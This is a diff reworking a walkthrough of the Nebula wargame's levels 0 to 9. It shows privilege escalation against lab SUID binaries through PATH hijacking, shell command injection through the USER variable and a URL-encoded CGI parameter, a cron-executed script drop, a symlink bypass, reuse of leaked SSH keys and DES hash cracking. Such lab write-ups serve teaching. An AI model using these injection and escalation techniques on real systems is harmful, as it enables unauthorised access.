@@ -10,131 +10,130 @@ Recently at work someone introduced a modified version of the [Nebula](https://e
 
 ## Level 0
 The instructions here are pretty clear: _find a Set User ID program that will run as the "flag00" account"_.
-?
-1
-2
-3
-4
-5
-6
+```bash
 level00@nebula:~$ find / -user flag00 -type f -executable 2>/dev/null
 /bin/.../flag00
 level00@nebula:~$ /bin/.../flag00
 Congrats, now run getflag to get your flag!
 flag00@nebula:~$ getflag
 You have successfully executed getflag on a target account
-Level 1
-The source code for a vulnerable SUID binary is presented. The programs run 'echo' command, without specifying its full path. So we build a custom executable, and run the vulnerable binary with PATH environment variable modified:. 
-In test.c file:
-?
-1
-2
-3
-4
+```
+
+## Level 1
+The source code for a vulnerable SUID binary is presented. The programs run 'echo' command, without specifying its full path:
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+```
+So we build a custom executable, and run the vulnerable binary with `PATH` environment variable modified:. 
+Create test.c file with the following content:
+```c
 int main(int argc, char **argv, char **envp)
 {
   system("/bin/getflag");
 }
-?
-1
-2
-3
+```
+
+Compile, run an get the flag:
+```
 level01@nebula:~$ gcc -o echo test.c
 level01@nebula:~$ PATH=/home/level01 /home/flag01/flag01
 You have successfully executed getflag on a target account
-Level 2
-Another source code for a vulnerable program that may allow arbitrary program to be executed. The USER environment is used as input for the echo command, but unsanitized:
-?
-1
+```
+
+## Level 2
+Another source code is presented for a vulnerable program that may allow arbitrary programs to be executed. The _USER_ environment variable is used as input for the echo command, but unsanitized:
+```c
+[..]
 asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
-So we could use an injection trick. We'll pass something like "levelx; /bin/getflag" 
-?
-1
-2
-3
-4
-5
+```
+
+So we could use an injection trick. We'll pass something like **`"levelx; /bin/getflag"`** :
+```bash
 level02@nebula:~$ USER="levelx; /bin/getflag" /home/flag02/flag02
 about to call system("/bin/echo levelx; /bin/getflag is cool")
 levelx
 You have successfully executed getflag on a target account
-level02@nebula:~$
-Level 3
-We're informed that "there is a crontab that is called every couple of minutes".  The script called is /home/flag03/writable.sh. This script parses the writable.d directory, and tests all files if they are executable (and executes them! - bash -x ). So we build a small script, place it in the writable directory and wait.for the crontab to execute:
-?
-1
-2
-3
-4
-5
-6
+```
+
+## Level 3
+We're informed that _there is a crontab that is called every couple of minutes_.  The script called is *__/home/flag03/writable.sh__*. This script parses the _`writable.d`_ directory, and tests all files if they are executable (and executes them! - _bash -x) ). So we'll build a small script, place it in the writable directory and wait.for the crontab to execute it:
+```bash
 level03@nebula:~$ vim /home/flag03/writable.d/scr
-  #!/bin/bash
-  getflag > /tmp/out
+#!/bin/bash
+getflag > /tmp/out
 level03@nebula:~$ chmod +x /home/flag03/writable.d/scr
 level03@nebula:~$ cat /tmp/out
 You have successfully executed getflag on a target account
-Level 4
-The goal here is to read the /home/flag04/token file from the SUID binary /home/flag04/flag04. But there is a check that prevents opening any file that has the string "token" in its name. A symbolic link solves this:
-?
-1
-2
-3
+```
+
+## Level 4
+The goal here is to read the *__/home/flag04/token__* file from the SUID binary _/home/flag04/flag04_. But there is a check that prevents opening any file that has the string "token" in its name. A symbolic link solves this:
+```bash
 level04@nebula:~$ ln -s /home/flag04/token /tmp/tk
 level04@nebula:~$ /home/flag04/flag04 /tmp/tk
 06508b5e-8909-4f38-b630-fdb148a848a2
 This token can then be used to log in as flag04 user.
+```
 
-Level 5
-The hint here is to check flag05 home directory, looking for week permissions.Indeed, the hidden .backup directory is readable by everyone, and contains the RSA public and private keys of flag05 user. We extract the archive into ~/.ssh,  and because we have the private key, we will be able to login through ssh as flag05:
-?
-1
-2
-3
-4
-5
-6
+## Level 5
+The hint here is to check flag05 home directory, looking for week permissions. Indeed, the hidden _.backup_ directory is readable by everyone, and contains the RSA public and private keys of flag05 user. We extract the archive into ~/.ssh,  and because we have the private key, we will be able to login through ssh as flag05:
+```bash
 level05@nebula:~$ tar xvf /home/flag05/.backup/backup-19072011.tgz
 .ssh/
 .ssh/id_rsa.pub
 .ssh/id_rsa
 .ssh/authorized_keys
 level05@nebula:~$ ssh flag05@localhost
-This article describes SSH authentication  using keys, and warns about leaving the passphrase empty: anybody getting your private key (~/.ssh/id_rsa) will be able to connect to the remote host.
+```
+This [article](https://www.debian.org/devel/passwordlessssh) describes key0based SSH authentication, and warns about leaving the passphrase empty: __*anybody getting your private key (~/.ssh/id_rsa) will be able to connect to the remote host*__.
 
-Level 6
-For this level, "The flag06 account credentials came from a legacy unix system". We see that the password for flag06 user is DES encrypted, and stored unshadowed directly in the /etc/passwd file:
-?
-1
-2
+## Level 6
+For this level, _The flag06 account credentials came from a legacy unix system_. We see that the password for flag06 user is *__DES encrypted, and stored unshadowed directly__* in the /etc/passwd file:
+```bash
 level06@nebula:~$ cat /etc/passwd | grep flag06
 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
-John the Ripper decrypts it instantaneously:
-?
-1
-2
-3
-4
-> echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > passwd
-> john.exe passwd
+```
+
+[John the Ripper](http://www.openwall.com/john/) decrypts it instantaneously:
+```
+~ echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > passwd
+~ john.exe passwd
 Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
 hello            (flag06)
-Level 7
-This level presents a vulnerable Perl script. The vulnerability lies in using the input 'Host' variable unsanitized, and can be exploited through an injection similar to level2:
-?
-1
+```
+
+## Level 7
+This level presents a vulnerable Perl script. The vulnerability lies in using the input __*Host*__ variable unsanitized, and can be exploited through an injection similar to level2:
+```perl
 @output = `ping -c 3 $host 2>&1`;
-?
-1
-2
-3
+```
+
+```bash
 level07@nebula:/home/flag07$ wget http://localhost:7007/index.cgi?Host=%3b%20getflag%20%3E%20/tmp/out07
 level07@nebula:/home/flag07$ cat /tmp/out07
 You have successfully executed getflag on a target account
-URL encoding is used to pass the ';', '>' and blank characters encoded
+```
+[URL encoding](http://meyerweb.com/eric/tools/dencoder/) is used above to pass the **_;_**, **_>_** and blank characters encoded.
 
-Level 8
-This presents a small capture to be analysed.  It proves to be a clear-text login to a Linux box, captured on capture.pcap file. We extract the stream (Follow TCP stream option  in Wireshark), and open it with a hex editor. Then we see the password as backdoor[\x7F][ \x7F ][ \x7F ]00Rm8[ \x7F ]ate. 0x7F is the ASCII code of delete key. So the reconstructed password for flag08 user is: backd00Rmate.
+## Level 8
+This presents a small capture to be analysed.  It proves to be a clear-text login to a Linux box, stored in the _capture.pcap_ file. We extract the stream (__Follow TCP stream__ option  in Wireshark), and open it with a hex editor. Then we see the password as __backdoor[\x7F][\x7F][\x7F]00Rm8[\x7F]ate. 0x7F is the ASCII code of delete key. So the reconstructed password for flag08 user is: **backd00Rmate**.
 
 Level 9
 The /home/flag09/flag09 executable is a SUID wrapper over the presented vulnerable PHP code. The vulnerability lies in using the e (PREG_REPLACE_EVAL) modifier with preg_replace function. As noted here,  "Use of this modifier is discouraged, as it can easily introduce security vulnerabilites".
